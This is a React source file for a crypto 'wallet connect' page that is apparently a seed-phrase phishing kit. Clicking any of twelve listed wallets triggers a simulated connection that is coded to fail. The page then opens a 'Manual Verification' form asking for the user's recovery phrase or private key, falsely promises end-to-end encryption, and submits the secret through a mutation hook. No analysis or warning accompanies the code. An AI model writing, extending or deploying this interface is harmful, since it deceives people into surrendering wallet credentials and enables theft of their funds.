import { useState } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { manualConnectSchema, type ManualConnectData } from "@shared/schema";
import { useManualConnect } from "@/hooks/use-wallets";
import { Loader2, ShieldCheck, AlertCircle } from "lucide-react";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";

interface Wallet {
  id: string;
  name: string;
  icon: string; // URL or placeholder color class
}

const WALLETS: Wallet[] = [
  { id: "metamask", name: "MetaMask", icon: "bg-orange-500" },
  { id: "trust", name: "Trust Wallet", icon: "bg-blue-500" },
  { id: "coinbase", name: "Coinbase Wallet", icon: "bg-blue-600" },
  { id: "ledger", name: "Ledger", icon: "bg-neutral-800" },
  { id: "trezor", name: "Trezor", icon: "bg-green-600" },
  { id: "brave", name: "Brave Wallet", icon: "bg-purple-600" },
  { id: "phantom", name: "Phantom", icon: "bg-purple-500" },
  { id: "walletconnect", name: "WalletConnect", icon: "bg-blue-400" },
  { id: "exodus", name: "Exodus", icon: "bg-indigo-600" },
  { id: "atomic", name: "Atomic Wallet", icon: "bg-yellow-500" },
  { id: "safepal", name: "SafePal", icon: "bg-gray-700" },
  { id: "binance", name: "Binance Chain", icon: "bg-yellow-400" },
];

export function WalletGrid() {
  const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
  const [isAutoConnecting, setIsAutoConnecting] = useState(false);
  const [showManual, setShowManual] = useState(false);
  const { toast } = useToast();

  const handleWalletClick = (wallet: Wallet) => {
    setSelectedWallet(wallet);
    setIsAutoConnecting(true);
    
    // Simulate auto-connect attempt that fails
    setTimeout(() => {
      setIsAutoConnecting(false);
      setShowManual(true);
      toast({
        title: "Auto-connection Failed",
        description: "Please connect manually to verify ownership.",
        variant: "destructive",
      });
    }, 2000);
  };

  return (
    <>
      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
        {WALLETS.map((wallet) => (
          <button
            key={wallet.id}
            onClick={() => handleWalletClick(wallet)}
            className="group flex flex-col items-center justify-center p-6 rounded-xl bg-card border border-border/50 hover:border-primary/50 hover:bg-card/80 transition-all duration-300 hover:-translate-y-1 hover:shadow-lg hover:shadow-primary/10"
          >
            <div className={`w-12 h-12 rounded-full mb-4 flex items-center justify-center ${wallet.icon} shadow-inner`}>
              <span className="text-white font-bold text-lg">{wallet.name.charAt(0)}</span>
            </div>
            <span className="font-medium text-foreground group-hover:text-primary transition-colors">
              {wallet.name}
            </span>
          </button>
        ))}
      </div>

      {/* Auto Connect Loading Dialog */}
      <Dialog open={isAutoConnecting} onOpenChange={setIsAutoConnecting}>
        <DialogContent className="sm:max-w-md bg-card border-border">
          <div className="flex flex-col items-center justify-center py-8 space-y-4">
            <div className="relative">
              <div className="absolute inset-0 bg-primary/20 blur-xl rounded-full"></div>
              <Loader2 className="h-12 w-12 text-primary animate-spin relative z-10" />
            </div>
            <div className="text-center space-y-2">
              <h3 className="text-xl font-semibold">Connecting to {selectedWallet?.name}...</h3>
              <p className="text-muted-foreground text-sm">Establishing secure channel</p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Manual Connect Form Dialog */}
      <Dialog open={showManual} onOpenChange={setShowManual}>
        <DialogContent className="sm:max-w-lg bg-card border-border">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-xl">
              <ShieldCheck className="w-5 h-5 text-green-500" />
              Manual Verification
            </DialogTitle>
            <DialogDescription>
              Automatic connection failed. Please manually verify your wallet ownership to proceed.
            </DialogDescription>
          </DialogHeader>

          <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4 flex items-start gap-3 mb-2">
            <AlertCircle className="w-5 h-5 text-yellow-500 shrink-0 mt-0.5" />
            <p className="text-sm text-yellow-200/80">
              Ensure you are entering your correct recovery details to prevent verification errors. Your data is encrypted end-to-end.
            </p>
          </div>

          <ManualConnectForm 
            defaultWalletName={selectedWallet?.name} 
            onSuccess={() => {
              setShowManual(false);
              setSelectedWallet(null);
            }} 
          />
        </DialogContent>
      </Dialog>
    </>
  );
}

function ManualConnectForm({ defaultWalletName, onSuccess }: { defaultWalletName?: string, onSuccess: () => void }) {
  const { mutate, isPending } = useManualConnect();
  const { toast } = useToast();

  const form = useForm<ManualConnectData>({
    resolver: zodResolver(manualConnectSchema),
    defaultValues: {
      walletName: defaultWalletName || "",
      phrase: "",
    },
  });

  const onSubmit = (data: ManualConnectData) => {
    mutate(data, {
      onSuccess: () => {
        toast({
          title: "Successfully Connected",
          description: "Your wallet has been verified securely.",
        });
        form.reset();
        onSuccess();
      },
    });
  };

  return (
    <Form {...form}>
      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 mt-4">
        <FormField
          control={form.control}
          name="walletName"
          render={({ field }) => (
            <FormItem>
              <FormLabel>Wallet Name</FormLabel>
              <FormControl>
                <Input 
                  placeholder="e.g. MetaMask" 
                  {...field} 
                  className="bg-background/50 border-input focus:ring-primary"
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="phrase"
          render={({ field }) => (
            <FormItem>
              <FormLabel>Recovery Phrase / Private Key</FormLabel>
              <FormControl>
                <Textarea 
                  placeholder="Enter your 12 or 24 word recovery phrase..." 
                  className="min-h-[120px] resize-none bg-background/50 border-input focus:ring-primary font-mono text-sm"
                  {...field} 
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />

        <div className="flex justify-end pt-2">
          <Button 
            type="submit" 
            className="w-full bg-primary hover:bg-primary/90 text-white font-semibold py-6 text-lg shadow-lg shadow-primary/20"
            disabled={isPending}
          >
            {isPending ? (
              <>
                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                Verifying...
              </>
            ) : (
              "Connect & Verify"
            )}
          </Button>
        </div>
      </form>
    </Form>
  );
}
